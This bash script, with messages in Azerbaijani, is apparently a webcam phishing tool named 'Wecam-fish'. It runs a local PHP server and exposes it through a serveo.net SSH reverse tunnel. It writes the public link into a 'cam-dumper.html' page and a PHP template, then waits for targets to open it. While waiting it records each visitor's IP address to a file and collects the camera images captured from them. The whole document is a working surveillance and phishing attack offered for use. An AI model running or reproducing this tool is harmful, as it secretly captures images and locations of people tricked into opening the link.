clear

rm Log.log *.zip > dev\null 2>&1 || true
mv *.png captured_files/old > dev\null 2>&1 || true
mv captured_files/new/*.png captured_files/old/ > dev\null 2>&1 || true

trap 'printf "\n";stop' 2

banner() {
    printf "                ()\n"
    printf "                )(\n"
    printf "            o======o\n"
    printf "                ||    \e[1;92mWecam-fish\e[0m\n"
    printf "                ||\n"
    printf "                ||\n"
    printf "        ,c88888888b\n"
    printf "        ,88888888888b\n"
    printf "        88888888888Y\n"
    printf "        ,,;,,;;\"Y888888Y\",,,,,,,;;,;\n"
    printf "\n"
}

stop() {
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
}

dependencies() {
    command -v php > /dev/null 2>&1 || {
        echo >&2 "PHP tələb olunur, amma quraşdırılmamışdır.";
        exit 1;
    }
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

    cat ip.txt >> saved.ip.txt
}

checkfound() {

    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Hədəfləri gözləyir,\e[0m\e[1;77m Çıxmaq üçün Ctrl + C düyməsini basın...\e[0m\n"
    
    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Hədəf linki açdı!\n"
            catch_ip
            rm -rf ip.txt
        fi

        sleep 0.5

        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] CAM faylı alındı!\e[0m\n"
            mv *.png captured_files/new > dev\null 2>&1 || true
            rm -rf Log.log
        fi

        sleep 0.5
    done 

}


server() {

    command -v ssh > /dev/null 2>&1 || {
        echo >&2 "SSH tələb olunur, amma quraşdırılmamışdır.";
        exit 1;
    }

    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Serveo Başlayır...\e[0m\n"

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi

    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
    sleep 8

    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] php serveri başlayır... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3

    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Birbaşa əlaqə:\e[0m\e[1;77m %s\n' $send_link
}

c="https"
q='"'

start1() {
    if [[ -e sendlink ]]; then
    rm -rf sendlink
    fi

    command -v php > /dev/null 2>&1 || {
        echo >&2 "SSH tələb olunur, amma quraşdırılmamışdır.";
        exit 1;
    }
    start
}


payload() {
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

    sed 's+forwarding_link+'$send_link'+g' cam-dumper.html > index2.html
    sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}

start() {
    server
    payload
    checkfound
}

banner
dependencies
start1
